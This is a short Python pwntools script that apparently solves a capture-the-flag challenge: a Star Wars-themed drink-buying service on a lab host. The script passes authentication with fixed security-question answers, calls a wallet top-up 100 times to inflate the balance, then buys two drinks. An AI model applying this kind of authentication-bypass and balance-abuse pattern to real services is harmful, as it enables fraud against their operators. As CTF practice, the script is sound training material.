from pwn import *

r = remote("10.45.1.2", 26408)

r.recvuntil(b'> ')
r.sendline(b'select_coin')
r.sendline(b'OLI')

r.recvuntil(b'> ')
r.sendline(b'select_wallet')
r.sendline(b'0xBEEF')

r.recvuntil(b'> ')
r.sendline(b'authenticate')

r.sendlineafter(b'?\n', b'Han')
r.sendlineafter(b'?\n', b'Vader')
r.sendlineafter(b'?\n', b'Kashyyyk')

for i in range(100):
    r.sendlineafter(b'> ', b'topup_wallet')

r.sendlineafter(b'> ', b'buy_drink')
r.sendline(b'Corellian Ale')

r.sendlineafter(b'> ', b'buy_drink')
r.sendline(b'Darksaber Distillate')

r.interactive()